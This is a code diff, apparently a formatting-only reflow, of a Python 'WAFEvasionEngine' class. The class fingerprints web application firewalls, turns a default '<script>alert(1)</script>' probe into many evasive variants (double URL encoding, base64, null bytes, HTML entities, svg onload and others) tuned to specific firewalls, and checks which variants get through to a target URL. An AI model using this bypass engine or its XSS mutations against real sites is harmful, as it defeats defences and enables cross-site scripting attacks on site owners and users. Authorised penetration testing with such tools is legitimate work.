@@ -58,6 +58,7 @@ class WAFEvasionEngine:
     def WAF_SIGNATURES(self):
         try:
             from tools.waf_signatures import WAF_SIGNATURES as CENTRAL_SIGS
+
             return {k: v.get("headers", []) + v.get("body", []) for k, v in CENTRAL_SIGS.items()}
         except ImportError:
             return {
@@ -88,7 +89,9 @@ class WAFEvasionEngine:
             time.sleep(min_interval - dt)
         self._last_req_ts = time.time()
 
-    def _send_probe(self, url: str, payload: str, headers: Optional[Dict[str, str]] = None) -> Tuple[int, str, Dict[str, str]]:
+    def _send_probe(
+        self, url: str, payload: str, headers: Optional[Dict[str, str]] = None
+    ) -> Tuple[int, str, Dict[str, str]]:
         """Send probe request and return status, body, response headers."""
         self._sleep_rate_limit()
         h = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}
@@ -108,7 +111,9 @@ class WAFEvasionEngine:
         except Exception as e:
             return -1, str(e)[:200], {}
 
-    def detect_waf(self, url: str, test_payload: str = "<script>alert(1)</script>") -> Tuple[Optional[str], float]:
+    def detect_waf(
+        self, url: str, test_payload: str = "<script>alert(1)</script>"
+    ) -> Tuple[Optional[str], float]:
         """
         Detect WAF presence and identify type.
         Returns (waf_type, confidence) or (None, 0.0)
@@ -141,18 +146,50 @@ class WAFEvasionEngine:
     def _get_mutation_techniques(self) -> List[MutationTechnique]:
         """Return all available mutation techniques."""
         techniques = [
-            MutationTechnique("urlencode", lambda p: urllib.parse.quote(p, safe=""), ["generic", "modsecurity"]),
-            MutationTechnique("double_urlencode", lambda p: urllib.parse.quote(urllib.parse.quote(p, safe=""), safe=""), ["generic"]),
-            MutationTechnique("base64", lambda p: urllib.parse.quote(__import__("base64").b64encode(p.encode()).decode(), safe=""), ["generic", "aws_waf"]),
+            MutationTechnique(
+                "urlencode", lambda p: urllib.parse.quote(p, safe=""), ["generic", "modsecurity"]
+            ),
+            MutationTechnique(
+                "double_urlencode",
+                lambda p: urllib.parse.quote(urllib.parse.quote(p, safe=""), safe=""),
+                ["generic"],
+            ),
+            MutationTechnique(
+                "base64",
+                lambda p: urllib.parse.quote(
+                    __import__("base64").b64encode(p.encode()).decode(), safe=""
+                ),
+                ["generic", "aws_waf"],
+            ),
             MutationTechnique("case_random", self._case_randomize, ["generic", "cloudflare"]),
-            MutationTechnique("comment_injection", self._insert_comments, ["modsecurity", "generic"]),
-            MutationTechnique("unicode_escape", lambda p: p.encode("unicode_escape").decode(), ["generic"]),
-            MutationTechnique("null_byte", lambda p: p.replace("<", "%00<").replace(">", "%00>"), ["generic"]),
-            MutationTechnique("tab_newline", self._tab_newline_obfuscate, ["cloudflare", "generic"]),
+            MutationTechnique(
+                "comment_injection", self._insert_comments, ["modsecurity", "generic"]
+            ),
+            MutationTechnique(
+                "unicode_escape", lambda p: p.encode("unicode_escape").decode(), ["generic"]
+            ),
+            MutationTechnique(
+                "null_byte", lambda p: p.replace("<", "%00<").replace(">", "%00>"), ["generic"]
+            ),
+            MutationTechnique(
+                "tab_newline", self._tab_newline_obfuscate, ["cloudflare", "generic"]
+            ),
             MutationTechnique("concat_break", self._concat_break, ["modsecurity"]),
-            MutationTechnique("hex_entities", lambda p: "".join([f"&#x{ord(c):x};" for c in p]), ["cloudflare", "generic"]),
-            MutationTechnique("decimal_entities", lambda p: "".join([f"&#{ord(c)};" for c in p]), ["cloudflare", "generic"]),
-            MutationTechnique("svg_payload", lambda p: f"<svg/onload={p.replace('<script>', '').replace('</script>', '')}>", ["generic"]),
+            MutationTechnique(
+                "hex_entities",
+                lambda p: "".join([f"&#x{ord(c):x};" for c in p]),
+                ["cloudflare", "generic"],
+            ),
+            MutationTechnique(
+                "decimal_entities",
+                lambda p: "".join([f"&#{ord(c)};" for c in p]),
+                ["cloudflare", "generic"],
+            ),
+            MutationTechnique(
+                "svg_payload",
+                lambda p: f"<svg/onload={p.replace('<script>', '').replace('</script>', '')}>",
+                ["generic"],
+            ),
         ]
         return techniques
 
@@ -179,7 +216,9 @@ class WAFEvasionEngine:
             return payload.replace("alert", "al" + "+" + "ert")
         return payload
 
-    def generate_mutations(self, base_payload: str, waf_type: Optional[str] = None, max_variants: int = 20) -> List[Tuple[str, List[str]]]:
+    def generate_mutations(
+        self, base_payload: str, waf_type: Optional[str] = None, max_variants: int = 20
+    ) -> List[Tuple[str, List[str]]]:
         """
         Generate mutated payloads.
         If waf_type known, prioritize techniques that work against it.
@@ -244,7 +283,9 @@ class WAFEvasionEngine:
             blocked = status in (403, 406, 409, 501, 502, 503) or len(body) < 50
 
             # Detect WAF from response
-            detected_waf, waf_conf = self.detect_waf(target_url, payload) if not waf_type else (waf_type, 0.8)
+            detected_waf, waf_conf = (
+                self.detect_waf(target_url, payload) if not waf_type else (waf_type, 0.8)
+            )
 
             result = WAFTestResult(
                 payload=payload[:200],
